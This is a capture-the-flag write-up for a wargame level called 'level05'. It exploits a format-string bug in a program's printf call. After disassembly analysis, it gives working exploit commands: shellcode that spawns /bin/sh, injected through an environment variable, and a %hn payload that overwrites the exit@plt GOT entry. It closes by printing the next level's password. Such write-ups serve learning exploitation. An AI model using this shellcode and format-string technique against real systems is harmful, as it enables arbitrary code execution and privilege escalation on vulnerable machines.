level05
By running level05 we can print stack using unprotected printf.
(python -c "print '%p ' * 2000") |  ./level05
0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6af 0xffffd6ae (nil) 0xffffffff 0xffffd734 0xf7fdb000 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 close

Program is quite small so let's look into assambler.
Dump of assembler code for function main:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   
   0x08048447 <+3>:	push   %edi
   0x08048448 <+4>:	push   %ebx
   0x08048449 <+5>:	and    $0xfffffff0,%esp             ; align the stack on 16 bytes
   0x0804844c <+8>:	sub    $0x90,%esp                   ; allocates 144 bytes on stack for local variables
   
   0x08048452 <+14>:	movl   $0x0,0x8c(%esp)              ; int i = 0
   0x0804845d <+25>:	mov    0x80497f0,%eax               ; stdin
   0x08048462 <+30>:	mov    %eax,0x8(%esp)               ; store input at esp+8
   0x08048466 <+34>:	movl   $0x64,0x4(%esp)              ; create buffer of 100 bytes at esp+4
   0x0804846e <+42>:	lea    0x28(%esp),%eax              ; char *buffer at eax
   0x08048472 <+46>:	mov    %eax,(%esp)
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>        ; fgets(buffer, 100, input)
   
   0x0804847a <+54>:	movl   $0x0,0x8c(%esp)              ; int i = 0
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   
   0x08048487 <+67>:	lea    0x28(%esp),%eax              ; "\n"
   0x0804848b <+71>:	add    0x8c(%esp),%eax
   0x08048492 <+78>:	movzbl (%eax),%eax                  ; return buffer[i]
   0x08048495 <+81>:	cmp    $0x40,%al                    ; if buffer[i] > 64 ... (al is the last 4 bytes of eax)
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   
   0x08048499 <+85>:	lea    0x28(%esp),%eax              ; load buffer
   0x0804849d <+89>:	add    0x8c(%esp),%eax
   0x080484a4 <+96>:	movzbl (%eax),%eax                  ; return buffer[i]
   0x080484a7 <+99>:	cmp    $0x5a,%al                    ; if buffer[i] > 90
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   
   0x080484ab <+103>:	lea    0x28(%esp),%eax           ; load buffer
   0x080484af <+107>:	add    0x8c(%esp),%eax
   0x080484b6 <+114>:	movzbl (%eax),%eax               ; return buffer[i]
   0x080484b9 <+117>:	mov    %eax,%edx
   0x080484bb <+119>:	xor    $0x20,%edx                ; buffer[i] ^ 0x20
   
   0x080484be <+122>:	lea    0x28(%esp),%eax           ; load buffer
   0x080484c2 <+126>:	add    0x8c(%esp),%eax
   0x080484c9 <+133>:	mov    %dl,(%eax)
   
   0x080484cb <+135>:	addl   $0x1,0x8c(%esp)           ; i += 1
   0x080484d3 <+143>:	mov    0x8c(%esp),%ebx
   0x080484da <+150>:	lea    0x28(%esp),%eax
   0x080484de <+154>:	movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:	mov    %eax,%edx
   0x080484e8 <+164>:	mov    $0x0,%eax
   0x080484ed <+169>:	mov    0x1c(%esp),%ecx
   0x080484f1 <+173>:	mov    %edx,%edi
   0x080484f3 <+175>:	repnz scas %es:(%edi),%al        ; strlen(buffer)
   0x080484f5 <+177>:	mov    %ecx,%eax
   0x080484f7 <+179>:	not    %eax
   0x080484f9 <+181>:	sub    $0x1,%eax
   0x080484fc <+184>:	cmp    %eax,%ebx
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   
   0x08048500 <+188>:	lea    0x28(%esp),%eax
   0x08048504 <+192>:	mov    %eax,(%esp)
   0x08048507 <+195>:	call   0x8048340 <printf@plt>    ; printf(buffer)
   
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>0x080497e8

   The program takes input from the stdin, and prints the output in lowercase.
   Let's check if stack is executable 
   readelf -l level05
   ***
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
   ***

   We inject our shellcode in the environment:
   export SHELLCODE=`python -c 'print("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`

   cat <(python -c 'print ("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%249x%10$hn" + "%65278x%11$hn")') - | ./level05
    "\xe0\x97\x04\x08" --> address of the high bytes of exit@plt
    "\xe2\x97\x04\x08" --> address of the low bytes of exit@plt
    "%249x%10$hn" --> write 0x0101 (0x101 = 0xf9(249) + 0x8) for the low address of our shellcode with index 10 ("\xe0\x97\x04\x08")
    "%65278x%11$hn" --> write 0xffff (0xffff = 0xfefe(65278) + 0x0101) for the high address of our shellcode with index 11 ("\xe2\x97\x04\x08")
    cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq